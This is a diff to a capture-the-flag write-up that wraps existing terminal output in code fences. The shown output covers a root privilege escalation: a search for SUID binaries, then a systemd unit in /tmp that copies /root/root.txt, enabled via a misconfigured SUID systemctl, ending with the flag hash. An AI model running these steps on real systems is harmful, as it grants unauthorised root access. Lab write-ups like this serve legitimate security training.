@@ -62,7 +62,7 @@ Revealed by port 22 (nmap)
 
 ## Its important to ensure you are always doing your reconnaissance thoroughly before progressing. Knowing all open services (which can all be points of exploitation) is very important, don't forget that ports on a higher range might be open so always scan ports after 1000 (even if you leave scanning in the background)
 
-
+~~~
 $ find / -user root -perm -4000 -print 2>/dev/null
 /usr/bin/newuidmap
 /usr/bin/chfn
@@ -90,8 +90,9 @@ $ find / -user root -perm -4000 -print 2>/dev/null
 /bin/fusermount
 /sbin/mount.cifs
 $ 
+~~~
 
-
+~~~
 $ cat > /tmp/flag.service << EOF
 > [Service]
 > ExecStart=/bin/bash -c "cat /root/root.txt > /tmp/flag.txt"
@@ -108,3 +109,4 @@ $ /bin/systemctl enable --now /tmp/flag.service
 Created symlink from /etc/systemd/system/multi-user.target.wants/flag.service to /tmp/flag.service.
 $ cat flag.txt	
 a58ff8579f0a9270368d33a9966c7fd5
+~~~
